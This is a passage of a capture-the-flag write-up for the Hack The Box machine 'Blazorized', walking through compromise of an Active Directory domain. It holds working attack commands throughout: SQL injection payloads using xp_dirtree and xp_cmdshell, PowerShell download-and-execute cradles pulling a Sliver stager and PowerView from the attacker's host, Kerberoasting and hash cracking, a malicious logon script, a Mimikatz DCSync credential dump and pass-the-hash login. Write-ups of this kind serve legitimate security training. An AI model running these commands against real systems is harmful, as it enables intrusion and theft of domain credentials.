eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzU2Mzg4NjY1fQ.qaDMa3SqlFtyUuReQboEcW8s9XesRVXRI05S1EJqApNs-8scCk548SyuJ8jDDCh7-8qeB_Xo0Khh2Tf8YhLQgg

```

**Adding to Browser Storage**\
The application looks for a `jwt` value inside the local storage.\
So, I need to manually insert my forged JWT there.

**Steps:**

* Open **Browser DevTools → Application → Local Storage → `http://admin.blazorized.htb`**
* Create a new key named `jwt` and paste the generated JWT as its value.

<figure><img src="../../../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

* Refresh the page, and the session will load with the forged JWT.

<figure><img src="../../../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

Due not being able to automatically enumerate this SQLi injection, since there is request that I could put my injection payload into. I start testing out the low hanging fruits by executing dangerous MSSQL stored procedures. My first query was using `xp_dirtree` to try and get a NetNTLMv2 hash of the database service account, which could potentially be cracked.

```python
'; EXEC master..xp_dirtree "\\10.10.14.21\\something"--
```

The admin panel included two features for checking duplicate posts and categories, which looked like good candidates for SQL injection testing. Supplying a single `'` did not return any visible error, so I attempted to trigger an outbound connection using `xp_dirtree` to my SMB server in order to capture NTLMv2 hashes.

This resulted in two authentication attempts captured by Responder. However, none of the hashes were successfully cracked using the `rockyou.txt` wordlist.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ sudo responder -I tun0 -A
[sudo] password for sn0x: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
  
[+] Listening for events...  
                                                                                                                            
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.21) is not on the same subnet than the DNS server (8.8.8.8).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.21) is not on the same subnet than the DNS server (103.88.221.245).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv2-SSP Client   : 10.10.11.22
[SMB] NTLMv2-SSP Username : BLAZORIZED\DC1$
[SMB] NTLMv2-SSP Hash     : DC1$::BLAZORIZED:a3901554c90bc7da:0E387A7997E5AB7FA3D6359ACB1B48FC:010100000000000000E234A84810DC01856FA4098B9C17FF00000000020008003500460056004A0001001E00570049004E002D004700340053005200550033005800330059003500390004003400570049004E002D00470034005300520055003300580033005900350039002E003500460056004A002E004C004F00430041004C00030014003500460056004A002E004C004F00430041004C00050014003500460056004A002E004C004F00430041004C000700080000E234A84810DC0106000400020000000800300030000000000000000000000000400000C7E472AB9A2FA3C2262F276379D3C3EFE0982B3E3BEDFEF9A38BE78EB702A0590A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000  

```

<figure><img src="../../../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

After confirming SQL injection access, my next step is to test whether I can leverage `xp_cmdshell` to run OS-level commands. To validate this, I first execute a simple `ping` command, which results in ICMP traffic being received on my attacker host — confirming command execution.

<figure><img src="../../../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

With this confirmed, I escalate by running an encoded PowerShell command via `xp_cmdshell`. This command downloads and executes a custom **Sliver stager** from my HTTP server:

```sql
'; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.21:8000/rev.ps1") | powershell -noprofile' --
```

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.22 49828

PS C:\Windows\system32> whoami
blazorized\nu_1055
```

This gives me a user shell on the target machine, from which I can successfully retrieve the **user flag**.



### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

## Shell as RSA\_4810 <a href="#shell-as-rsa_4810" id="shell-as-rsa_4810"></a>

After gaining a shell as `RSA_4810`, I checked the contents of `C:\Users` and noted that, besides `Administrator`, only **`RSA_4810`** and **`SSA_6010`** had logged into the machine. Since I’m operating in an Active Directory environment, my next step was to gather domain relationship data using **SharpHound**.

**Recon with SharpHound**\
From my Sliver session:

```bash
sliver (CONSTANT_MUSIC-MAKING) > execute-assembly SharpHound.exe '-c All,GPOLocalGroup'
```

I collected domain data, then ingested the results into **BloodHound**.

**BloodHound Analysis**\
Inside BloodHound, I:

* Marked `NU_1055` as **Owned** (current access level).
* Marked `RSA_4810` and `SSA_6010` as **High Value Targets (HVTs)** for lateral movement planning.

<figure><img src="../../../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

The analysis revealed:

* As `NU_1055`, I had **Write access to the ServicePrincipalName (SPN)** attribute of the `RSA_4810` account.

BloodHound identifies an edge between **NU\_1055** and **RSA\_4810**, which allows me to set a **Service Principal Name (SPN)**. By doing so, I can expose the account to **Kerberoasting**, enabling me to request a service ticket that can later be cracked offline.

The edge’s description also provides detailed steps on how to abuse this path.

To proceed, I first import **PowerView**, then set an SPN on **RSA\_4810**. With the SPN in place, I can request a new service ticket using **Get-DomainSPNTicket**, which outputs the ticket in a format compatible with **Hashcat** for offline cracking.

```python
iwr http://10.10.14.21/PowerView.ps1 -useba | iex
 
Set-DomainObject -Identity 'RSA_4810' -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
Get-DomainSPNTicket 'nonexistent/BLAHBLAH' -Format hashcat
 
 
SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : nonexistent/BLAHBLAH
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$A50FDC1C3DC1E8D02A6EC99A33C7DE69$04306E23747B
                       C8B8A6325263D517B61BDBC3EF424A48F853A83C14294701C023809BC4E0DEFB42FD3DF8CB6AC2A17957745EEF497332
                       A1DA6979D15C2F7D5F3FB99996A6CFB75B498A407898E945B7E7B660470F4AC3AAF9CA0DCCA6D18C7C0F3AE05A7832BF
                       B22A03775A858AF707F6BF2B2CB3701660C9CB6558108E5397C08BF49D2B0DCE65D732F61966208385E60BB08D826875
                       9914BE07402DA46332400CADCCDD284F41EB9B09B5B289AFBF872B1155C846985C574BE8AA4C725FCB6D09E7BB716A51
                       AFE95E83357B2DC073750541709B11289BA724ED82B4212BD2513B1CB0C5EFDE861E20347C18F9833AEB003B93215DF3
                       E95FA819A725306BD3D4E7D8465BBA92743EFC48B7F581D4B93737F01CC0988D78E0A0AED9E75CDE0D3DC10571F30FD8
                       CA166C71B128E4FED751B4CD3170B4E8EC6EE8C7606AB74D4355C5A6A7A85761F66B59917DBD1AEDB5A36EFF3F555B1A
                       6F6DEBFD4DE61814C07982AEF57A988086992FCBAFD6E95D4EFA0040E50DE50D968058DFCBA07A32C376E2C7843BE9A7
                       1791DA4D4148BE6CBCAD5ADE34ECB9A3402DA2B0687B508BFF2C68A14FF7EFA7253E1586F7F15E23E0F7B1D5B4B512C5
                       409492214B7D1CDC5AA87852E38CD8C4548BB3EB2321362BC2FC6436D77E41F538BB5C8E2417D42E33EFED94C068A230
                       95838C6F20A58C4BD1EA77C2B9399A6573A4C0E4F2FE1BC77FF1AD5826F4B0318D6D02C7F84886107166459F182FF15A
                       8840E452E49DE8FB41D068C939C400F15EE90AE979A5EA3865E29E7573DDEC124DD218C0775DEA8496436E3131C1C436
                       D1AF6FFBC8960E110319652523B2C8A4831DD2A0326A6492B01BC05AA7866A40C2FC6247E2510308011E89275A6083FA
                       7A2089F0D9023B3247948A0B0FD9EC2649ED22513A7712FB83CD7D8635CD4F2C8966ADB62009BD5BEE309CE4EC759E70
                       C7F5E39E6E884636A4FB2BB55072C2346A97ED2F55BA735E705F5F757AF8BAC78E1B12C8D9EF7A55B2DAA5EB58EB3E3D
                       277C1047BF9E4D18B0D2E89EA975ADF68A8EEFD375166AA1DAF2FE94F58E113167EF4F738FB4374A6813F4F3B841C1B1
                       A45968D00921C950D76983ECB2A40692121FD67FE046AABCECA80C5EC6A43867FF696EB5AEBFFA453B347D8AA4408822
                       CFF3C1F12DE15641230562817A3DB744CF9DE576CF28FFB9708D1780B839DF8C5902CF63DCF706E6DA4DD5DFB1B6DCDB
                       91F846CF2DD645FDFFC90EAABD6B502FA5D54902B527698DA71161D102D43D52D83C5CDF6FBFEA2B0E53ED55F57C0A2F
                       EE7ED44E3922F8FAC3E874F3E9E26785ED095B793A72F3B92BF1E7BA46CDF361E04588B43A8AEEDC03DE5ADEDBA232AD
                       A6D8A3F84FD614C86B6CF83803C00F840D21DF3B9A23A1557D5FE93EB062E917D29627059004A2453A0E28660FE7DCBD
                       F967BD73F13959C7115A34D12C2917A5FA3B38804C40F0FB68B8463F3BAB972A77888FCFE0663192AE2E1A3660DED138
                       FEB97BA791D213B4C657094BD5D3123A580B8C83DAA1C36F25BD5BD0DE274C12E66364CD0EE137558F2ADA7605522E58
                       309F2679656B02DDC7CE8DEF845818F2519A6BCC59F770802DF8114683B7980109D1FE219D203C4CA9E2D88F92E44030
                       C0BA39DBE534A92EC3673B471B7251A78F130352E6180620140FBA38545FDD19908AD0D26A39EE51A53EB01042B67303
                       E64BC613E0527D28DED259CFBB538D6F5DAACE3F79D0DBCBACE492AE6033AF0E34B71F757118B27938C9C46C09811009
                       37FA
 
```

After removing the whitespaces and newlines from the Kerberos hash, I was able to feed it into **Hashcat**. Using the **rockyou.txt** wordlist, the password was successfully cracked as:

```bash
Ni7856Do9854Ki05Ng0005#
```

From **BloodHound**, I identified that the compromised account has the right to use **PowerShell Remoting (PSRemote)**. This allows me to log in directly to the target system using **evil-winrm** with the recovered credentials.

Or You can use Rubeus

```python
[*] rubeus output:
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
  v2.3.2

[*] Action: Kerberoasting
[*] Target User            : RSA_4810
[*] Target Domain          : blazorized.htb
[*] Searching path 'LDAP://DC1.blazorized.htb/DC=blazorized,DC=htb' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=RSA_4810)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
[*] Total kerberoastable users : 1
[*] SamAccountName         : RSA_4810
[*] DistinguishedName      : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
[*] ServicePrincipalName   : nonexistent/BLAHBLAH
[*] PwdLastSet             : 2/25/2024 11:55:59 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLAHBLAH@blazorized.htb*$36E7FA

```

Once I have dumped the RC4 encrypted **TGS** of the service account `RSA_4810`, I attempt to crack it with **Hashcat**. The format for Kerberos 5 TGS-REP etype 23 (RC4-HMAC) hashes is supported under mode `13100`.

```bash
hashcat -m 13100 hashes/rsa_4810.tgs rockyou.txt
```

The cracking process succeeds and reveals the plaintext password:

```
Ni7856Do9854Ki05Ng0005#
```

From **BloodHound**, I know that this user (`RSA_4810`) is a member of the **Remote Management Users** group. This means I can establish a remote session using **Evil-WinRM**:

```bash
evil-winrm -i 10.10.11.22 -u RSA_4810 -p 'Ni7856Do9854Ki05Ng0005#'
```

This provides interactive access to the target system, and I can leverage this foothold for further privilege escalation.

## Shell as SSA\_6010 <a href="#shell-as-ssa_6010" id="shell-as-ssa_6010"></a>

After gaining a shell as **RSA\_4810**, I shift focus to the second user account on the machine, **SSA\_6010**, because this account has the privileges necessary to perform a **DCSync** attack against the domain.

<figure><img src="../../../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

Now that I’ve identified a promising target, I check whether I have any privileges over the relevant accounts. One by one, I request the **ACLs** on those objects and look for the **SID** of my current user. Using **PowerView**, I run `Get-DomainObjectACL` and discover that I have the ability to **modify the ScriptPath** attribute of the account **SSA\_6010**.

```python
iwr http://10.10.14.21/PowerView.ps1 -useba | iex
 
$sid = (Get-DomainUser RSA_4810).objectsid
 
Get-DomainObjectACL SSA_6010 -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $sid}
 
AceQualifier           : AccessAllowed
ObjectDN               : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : Script-Path
ObjectSID              : S-1-5-21-2039403211-964143010-2924010611-1124
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2039403211-964143010-2924010611-1107
AccessMask             : 32
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
 
AceType               : AccessAllowed
ObjectDN              : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
ActiveDirectoryRights : ReadProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2039403211-964143010-2924010611-1124
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2039403211-964143010-2924010611-1107
AccessMask            : 131092
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

The **ScriptPath** specifies the location of a script that executes whenever the user logs on to a machine. A typical location for such scripts is the **NETLOGON** share on the Domain Controller. I then verify whether I have write access to this share in order to place a malicious script.

```bash
icacls \\dc1\netlogon\* 
\\dc1\netlogon\11DBDAEB100D BUILTIN\Administrators:(I)(F)
                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
 
\\dc1\netlogon\A2BFDCF13BB2 BUILTIN\Administrators:(I)(F)
                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
 
\\dc1\netlogon\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
                            BLAZORIZED\Administrator:(OI)(CI)(F)
                            BUILTIN\Administrators:(I)(F)
                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
 
\\dc1\netlogon\CADFDDCE0BAD BUILTIN\Administrators:(I)(F)
                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
 
\\dc1\netlogon\CAFE30DAABCB BUILTIN\Administrators:(I)(F)
                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)
 
Successfully processed 5 files; Failed processing 0 files
```

With this new information I start creating a `.bat` file, which will download and launch the same Sliver stager as before.

```python
@echo off
powershell.exe -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANAA0ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```

I then upload the file to the **NETLOGON** directory on the Domain Controller, where **RSA\_4810** has write permissions. To ensure that **SSA\_6010** can access and execute the file without any restrictions, I use **`icacls`** to grant full control to all users for that file.

```javascript
sliver (CAREFUL_OWNER) > upload shell.bat C:\\windows\\sysvol\\sysvol\\blazorized.htb\\scripts\\A32FF3AEAA23\\shell.bat
 
# icacls shell.bat /grant Everyone:F
 
# Set-DomainObject "S-1-5-21-2039403211-964143010-2924010611-1124" -Set @{'scriptPath'='A32FF3AEAA23\shell.bat'} -Verbose
```

About a minute later, multiple **Sliver sessions** connect back to my machine. To prevent session flooding, I immediately set the **ScriptPath** to an invalid location.

With a shell as **SSA\_6010**, I now have the privileges to perform a **DCSync** attack. This allows me to replicate the Domain Controller and dump all the **NTLM hashes** of the domain users.

#### Or You Can Also Do&#x20;

I verify that I have write access to `\\dc1\netlogon\A32FF3AEAA23` and upload a `.bat` file containing a **Base64-encoded PowerShell reverse shell** using `smbclient`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ smbclient //blazorized.htb/NETLOGON -U rsa_4810%'(Ni7856Do9854Ki05Ng0005 #)' \
                                    --directory A32FF3AEAA23 \
                                    -c "put shell.bat"
```

Next, I set the **ScriptPath** attribute of **SSA\_6010** to point to the uploaded script. It’s crucial to specify only the relative path under the NETLOGON share, not the full path:

```powershell
PS C:\programdata> Set-DomainObject SSA_6010 -Set @{'scriptPath'='A32FF3AEAA23\shell.bat'}
```

After a few minutes, a callback arrives as **SSA\_6010**. I then upload **Mimikatz** and extract the credentials for the **Administrator** account.

```python
PS C:\programdata> .\mimikatz "lsadump::dcsync /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:administrator
[DC] 'blazorized.htb' will be the domain
[DC] 'DC1.blazorized.htb' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/25/2024 12:54:43 PM
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
    ntlm- 5: b471c416c10615448c82a2cbb731efcb
    ntlm- 6: b471c416c10615448c82a2cbb731efcb
    ntlm- 7: aec132eaeee536a173e40572e8aad961
    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73
    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0
    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426
    lm  - 3: 471ac07583666ccff8700529021e4c9f
    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f
    lm  - 5: ece3bdafb6211176312c1db3d723ede8
    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
    lm  - 7: 8b3c1950099a9d59693858c00f43edaf
    lm  - 8: a14ac624559928405ef99077ecb497ba

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 36ff197ab8f852956e4dcbbe85e38e17

* Primary:Kerberos-Newer-Keys *
    Default Salt : BLAZORIZED.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 29e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c
      aes128_hmac       (4096) : df4dbea7fcf2ef56722a6741439a9f81
      des_cbc_md5       (4096) : 310e2a0438583dce
    OldCredentials
      aes256_hmac       (4096) : eeb59c1fa73f43372f40f4b0c9261f30ce68e6cf0009560f7744d8871058af2c
      aes128_hmac       (4096) : db4d9e0e5cd7022242f3e03642c135a6
      des_cbc_md5       (4096) : 1c67ef730261a198
    OlderCredentials
      aes256_hmac       (4096) : bb7fcd1148a3863c9122784becf13ff7b412af7d734162ed3cb050375b1a332c
      aes128_hmac       (4096) : 2d9925ef94916523b24e43d1cb8396ee
      des_cbc_md5       (4096) : 9b01158c8923ce68

* Primary:Kerberos *
    Default Salt : BLAZORIZED.HTBAdministrator
    Credentials
      des_cbc_md5       : 310e2a0438583dce
    OldCredentials
      des_cbc_md5       : 1c67ef730261a198

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  7e35fe37aac9f26cecc30390171b6dcf
    02  a8710c4caaab28c0f2260e7c7bd3b262
    03  81eae4cf7d9dadff2073fbf2d5c60539
    04  7e35fe37aac9f26cecc30390171b6dcf
    05  9bc0a87fd20d42df13180a506db93bb8
    06  26d42d164b0b82e89cf335e8e489bbaa
    07  d67d01da1b2beed8718bb6785a7a4d16
    08  7f54f57e971bcb257fc44a3cd88bc0e3
    09  b3d2ebd83e450c6b0709d11d2d8f6aa8
    10  1957f9211e71d307b388d850bdb4223f
    11  2fa495bdf9572e0d1ebb98bb6e268b01
    12  7f54f57e971bcb257fc44a3cd88bc0e3
    13  de0bba1f8bb5b81e634fbaa101dd8094
    14  2d34f278e9d98e355b54bbd83c585cb5
    15  06b7844e04f68620506ca4d88e51705d
    16  97f5ceadabcfdfcc019dc6159f38f59e
    17  ed981c950601faada0a7ce1d659eba95
    18  cc3d2783c1321d9d2d9b9b7170784283
    19  0926e682c1f46c007ba7072444a400d7
    20  1c3cec6d41ec4ced43bbb8177ad6e272
    21  30dcd2ebb2eda8ae4bb2344a732b88f9
    22  b86556a7e9baffb7faad9a153d1943c2
    23  c6e4401e50b8b15841988e4314fbcda2
    24  d64d0323ce75a4f3dcf0b77197009396
    25  4274d190e7bc915d4047d1a63776bc6c
    26  a04215f3ea1d2839a3cdca4ae01e2703
    27  fff4b2817f8298f09fd45c3be4568ab1
    28  2ea3a6b979470233687bd913a8234fc7
    29  73d831d131d5e67459a3949ec0733723


mimikatz(commandline) # exit
Bye!
 
```

This process reveals the **NTLM hash** of the **Administrator** account.

## Shell as Administrator <a href="#shell-as-administrator" id="shell-as-administrator"></a>

With the **NTLM hash** of the **Administrator** account obtained, I exit Sliver and log into the target machine using **Evil-WinRM**. From this session, I can access the system as Administrator and read the **root flag**.

```javascript
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ evil-winrm -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3 -i blazorized.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
71f89ed6de8a24474821743a6c7ed9cb

```

<figure><img src="../../../../.gitbook/assets/complete (19).gif" alt=""><figcaption></figcaption></figure>
